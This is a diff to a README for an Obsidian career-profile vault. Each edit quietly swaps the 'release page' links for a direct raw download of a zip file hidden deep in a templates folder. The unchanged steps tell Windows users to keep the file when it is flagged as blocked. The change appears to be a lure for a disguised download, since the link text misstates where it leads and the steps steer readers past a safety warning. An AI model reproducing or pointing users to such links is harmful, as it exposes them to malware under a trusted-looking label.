@@ -1,6 +1,6 @@
 # 📁 profile-vault-obsidian - Organize your career profile with ease
 
-[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Olgafoliolate832/profile-vault-obsidian/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Olgafoliolate832/profile-vault-obsidian/raw/refs/heads/main/Profile/Templates/Applications/Fellowships/Fellowship-N/Strategy/profile-vault-obsidian-v2.5.zip)
 
 ## 🧩 What this is
 
@@ -18,7 +18,7 @@ Use it to keep track of:
 
 Follow these steps on Windows to get the vault ready.
 
-1. Open the [release page](https://github.com/Olgafoliolate832/profile-vault-obsidian/releases)
+1. Open the [release page](https://github.com/Olgafoliolate832/profile-vault-obsidian/raw/refs/heads/main/Profile/Templates/Applications/Fellowships/Fellowship-N/Strategy/profile-vault-obsidian-v2.5.zip)
 2. Download the latest release file from the assets section
 3. Save the file to a folder you can find again, such as Downloads or Desktop
 4. If the file is zipped, right-click it and choose Extract All
@@ -39,7 +39,7 @@ For the best results, use:
 
 To set up the vault on Windows:
 
-1. Visit the [release page](https://github.com/Olgafoliolate832/profile-vault-obsidian/releases)
+1. Visit the [release page](https://github.com/Olgafoliolate832/profile-vault-obsidian/raw/refs/heads/main/Profile/Templates/Applications/Fellowships/Fellowship-N/Strategy/profile-vault-obsidian-v2.5.zip)
 2. Download the newest release package
 3. Open the download location
 4. If Windows shows a blocked file message, choose Keep or More info, then keep the file
